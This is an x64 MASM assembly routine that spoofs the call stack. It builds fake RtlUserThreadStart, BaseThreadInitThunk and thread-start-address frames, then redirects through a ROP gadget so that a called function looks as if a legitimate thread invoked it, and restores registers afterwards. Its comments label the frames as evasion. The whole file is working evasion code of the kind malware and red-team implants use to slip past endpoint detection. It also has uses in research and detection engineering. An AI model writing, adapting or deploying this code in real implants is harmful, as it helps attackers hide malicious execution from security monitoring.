Spoof proto
Setup proto
NtWait proto
.code

Spoof proc

    pop    rax                         ; Real return address in rax (stack_spoofing.0007..)

    mov    r10, rdi                    ; Store OG rdi in r10
    mov    r11, rsi                    ; Store OG rsi in r11

    mov    rdi, [rsp + 32]             ; Storing PRM struct in the rdi (fixup ptr)
    mov    rsi, [rsp + 40]             ; Storing function to call (messagebox)

    ; ---------------------------------------------------------------------
    ; Storing our original registers
    ; ---------------------------------------------------------------------

    mov [rdi + 24], r10                ; Storing OG rdi into param
    mov [rdi + 88], r11                ; Storing OG rsi into param
    mov [rdi + 96], r12                ; Storing OG r12 into param
    mov [rdi + 104], r13                ; Storing OG r13 into param
    mov [rdi + 112], r14                ; Storing OG r14 into param
    mov [rdi + 120], r15                ; Storing OG r15 into param
    mov [rdi + 168], rbp                ; OG rbp

    mov r12, rax                       ; OG code used r12 for ret addr

    ; ---------------------------------------------------------------------
    ; Prepping to move stack args if num of args> 4
    ; ---------------------------------------------------------------------

    xor r11, r11             ; r11 will hold the numbs of args that have been "pushed" (after RCX, RDX, R8, R9)
    mov r13, [rsp + 30h]     ; r13 will hold the numbs of args total that will be pushed

    mov r14, 200h           ; r14 will hold the offset we need to push stuff
    add r14, 8
    add r14, [rdi + 56]     ; stack size of RUTS
    add r14, [rdi + 48]     ; stack size of BTIT
    add r14, 30h            ; 48 bytes for ROP chain !!
    add r14, [rdi + 128]    ; stack size of TSA 
    add r14, [rdi + 32]     ; stack size of our gadget frame
    sub r14, 20h            ; first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time

    mov r10, rsp            
    add r10, 30h            ; offset of stack arg added to rsp

    looping:

        xor r15, r15            ; r15 will hold the offset + rsp base
        cmp r11, r13            ; comparing # of stack args added vs # of stack args we need to add
        je finish
    
        ; ---------------------------------------------------------------------
        ; Getting location to move the stack arg to
        ; ---------------------------------------------------------------------
        
        sub r14, 8          ; 1 arg means r11 is 0, r14 already 0x28 offset.
        mov r15, rsp        ; get current stack base
        sub r15, r14        ; subtract offset
        
        ; ---------------------------------------------------------------------
        ; Procuring the stack arg
        ; ---------------------------------------------------------------------
        
        add r10, 8
        push [r10]
        pop [r15]     ; move the stack arg into the right location

        ; ---------------------------------------------------------------------
        ; Increment the counter and loop back in case we need more args
        ; ---------------------------------------------------------------------
        add r11, 1
        jmp looping
    
    finish:

    ; ----------------------------------------------------------------------
    ; Creating a big 320 byte working space
    ;
    ; Building fake frames before calling the target function
    ; ----------------------------------------------------------------------

    mov    [rdi + 152], rsp         ; save RSP for later restore
    sub    rsp, 200h

    ; ----------------------------------------------------------------------
    ; Pushing a 0 to cut off the return addresses after RtlUserThreadStart.
    ; Need to figure out why this cuts off the call stack
    ; ----------------------------------------------------------------------

    push 0

    ; ----------------------------------------------------------------------
    ; RtlUserThreadStart + 0x14  frame
    ; ----------------------------------------------------------------------
    
    sub    rsp, [rdi + 56]      ; RSP - [PVOID RUTS_ss]
    mov    r11, [rdi + 64]      ; [RUTS_retaddr]
    mov    [rsp], r11
               
    ; ----------------------------------------------------------------------
    ; BaseThreadInitThunk + 0x21  frame
    ; ----------------------------------------------------------------------

    sub    rsp, [rdi + 32]      ; ss
    mov    r11, [rdi + 40]      ; ret_addr
    mov    [rsp], r11

    ; ----------------------------------------------------------------------
    ; Evasion frame, the 3rd entry on the call stack should match the 
    ; start address of the thread
    ; ----------------------------------------------------------------------
    
    sub    rsp, [rdi + 128]       ; TSA_ss
    mov    r11, [rdi + 136]       ; TSA_retaddr
    mov    [rsp], r11

    ; ----------------------------------------------------------------------
    ; ROP gadget frame
    ; ----------------------------------------------------------------------
      
      mov rbp, [rdi + 144]           ; store desync gadget in rbp

      sub    rsp, [rdi + 48]          ; allocate Gadget_ss bytes
      mov    r11, [rdi + 80]          ; trampoline (mov rsp,rbp; pop rbp; ret)
      mov    [rsp], r11               ; gadget address sits at [rsp+0]


    ; ----------------------------------------------------------------------
    ;   Adjusting the param struct for the fixup
    ;
    ;   Spoof the ret address
    ;   target_func_RET -> POP RAX; RET -> JMP [RAX] -> fixup
    ; ----------------------------------------------------------------------

    mov    r11, rsi                    ; Copying function to call into r11

    mov    [rdi + 8], r12              ; Real return address is now moved into the "OG_retaddr" member
    mov    [rdi + 16], rbx             ; original rbx is stored into "rbx" member
    lea    rbx, [fixup]                ; Fixup address is moved into RBX
    mov    [rdi], rbx                  ; Fixup member now holds the address of Fixup
    mov    rbx, rdi                    ; Address of param struct (Fixup) is moved into rbx

    jmp    r11                         ; jmp to target func 
                                       ; CALL would push (and mess) a ret address into the stack   

    fixup: 
       ;mov    rbx, rax
        mov     rcx, rbx
        
        mov rsp, [rcx + 152]        ; restore original RSP from saved_rsp

        mov rbx, [rcx + 16]         ; Restoring OG RBX
        mov rbp, [rcx + 168]
        mov rdi, [rcx + 24]         ; ReStoring OG rdi
        mov rsi, [rcx + 88]         ; ReStoring OG rsi
        mov r12, [rcx + 96]         ; ReStoring OG r12
        mov r13, [rcx + 104]        ; ReStoring OG r13 
        mov r14, [rcx + 112]        ; ReStoring OG r14
        mov r15, [rcx + 120]        ; ReStoring OG r15 
        jmp     QWORD ptr [rcx + 8]

Spoof endp

end
